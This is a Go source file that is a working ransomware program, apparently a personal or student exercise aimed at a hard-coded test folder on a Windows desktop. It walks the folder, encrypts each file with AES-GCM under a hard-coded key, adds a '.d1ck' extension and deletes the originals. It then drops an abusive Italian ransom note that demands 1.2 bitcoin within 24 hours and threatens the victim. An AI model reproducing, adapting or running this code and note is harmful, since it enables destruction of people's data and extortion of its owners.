package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"io"
	"io/fs"
	"log"
	"os"
	"path/filepath"
)

func create_ransom_letter() {
	// file content
	content := `Ah, si' proprio un idiota, eh? Mi hai lasciato tutta 'a porta aperta e mo' 'o computer è mio. 
Te lo dico chiaramente: se non mi fai subito 'o pagamento, ti faccio sparire tutto, e te lo giuro, ti distruggo tutta 'a vita digitale. 
Nun penserai mica che sto scherzando, vero? Tutto ciò che c'hai lì dentro, tutte 'e foto, i file, i documenti, 'e cose che pensavi fossero sicure…
Te l'avevano detto di stare attento, che quella stronzata che hai scaricato ti avrebbe fatto guai. Mo' lo vediamo. 
Tutto criptato, ogni singolo dato chiuso a chiave.
Vuoi riprendere il controllo? E allora paga subito, o te ne scordi.

Io sto parlando serio. Senza 'o riscatto, NON vedrai più nulla. E se pensi che possa sistemare 'sta cosa, ti sbagli di grosso.
Senza i soldi, i tuoi file diventano 'nu macello, e non esiste programma che ti può aiutare. 
Ti faccio fare 'na bella figura da cazzone se pensi che puoi risolvere da solo.

Cosa devi fare?

Deposita 1.2 BITCOIN (vedi sotto) sul mio conto entro 24 ore.

Se non paghi, ti prendo ogni cosa che hai: le password, i documenti, tutto quanto. 
O ti pieghi adesso, o vedi 'o disastro. Senza riscatto, tutto diventa irrimediabile.
Te lo dico chiaro: non ci saranno più "opportunità", non ci saranno “secondi tentativi”. 
Hai un tempo limitato, e non mi interessa che hai bisogno di quei file per lavoro, o per l'università. 
Il tuo danno sarà peggio di qualsiasi altra cosa, e se non metti mano alla tasca, ti rovino la vita digitale, non ti farò più accedere a un cazzo.

Non perdere tempo a pensare, fai quello che ti dico o vedrai la tua vita andarsene in fumo, file dopo file.


(P.S.: Se pensi che ti faccia paura chiamare la polizia, sappi che ti controllo. Te lo ripeto: l'unico modo per risolvere 'sta merda è pagare, e subito.)
`

	var ransom_letter_path string = "C:\\Users\\EdoardoEnricomariaFo\\Desktop\\READ THIS, IDIOT.txt"

	f, err := os.Create(ransom_letter_path)
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()

	_, err2 := f.WriteString(content)
	if err2 != nil {
		log.Fatal(err2)
	}
}

func encrypt_file(file_path string) { // see: https://medium.com/@mertkimyonsen/encrypt-a-file-using-go-f1fe3bc7c635
	file_contents, err := os.ReadFile(file_path) // open and read the file
	if err != nil {
		log.Fatalf("Read file error occured: %v", err.Error())
	}

	secret_key := []byte("4f9a3b7c1d2e8f9a4c3d5b2e")

	// create a cipher block based on the secret key
	block, err := aes.NewCipher(secret_key)
	if err != nil {
		log.Fatalf("Cipher error occured: %v", err.Error())
	}

	// create GCM mode
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		log.Fatalf("Cipher GCM error: %v", err.Error())
	}

	// generate random nonce
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		log.Fatalf("Nonce  error: %v", err.Error())
	}

	// prepare the encrypted file contents
	enc_contents := gcm.Seal(nonce, nonce, file_contents, nil)

	// add the .d1ck extension to the current file extension
	var enc_file_path string = file_path + ".d1ck"

	// create the encrypted file
	err = os.WriteFile(enc_file_path, enc_contents, 0777)
	if err != nil {
		log.Fatalf("Write file error: %v", err.Error())
	}

	// remove the old file
	os.Remove(file_path)
}

func explore_directory(parent_dir string) {
	err := filepath.WalkDir(parent_dir, func(path string, file fs.DirEntry, err error) error {
		if !file.IsDir() { // it's a file, not a directory
			encrypt_file(path)
		} else { // don't encrypt the folder (but the files inside, see the if block)
			// nothing
		}

		return nil
	})

	if err != nil {
		log.Fatalf("Impossible to walk directory: %s", err)
	}
}

func main() {
	const USER_DIR string = "C:\\Users\\EdoardoEnricomariaFo\\Desktop\\TEST_FOLDER"

	if _, err := os.Stat(USER_DIR); os.IsNotExist(err) { // check if the directory exists
		log.Fatalf("Directory %s doesn't exist, check the code please :)", USER_DIR)
	}

	explore_directory(USER_DIR)

	create_ransom_letter()
}
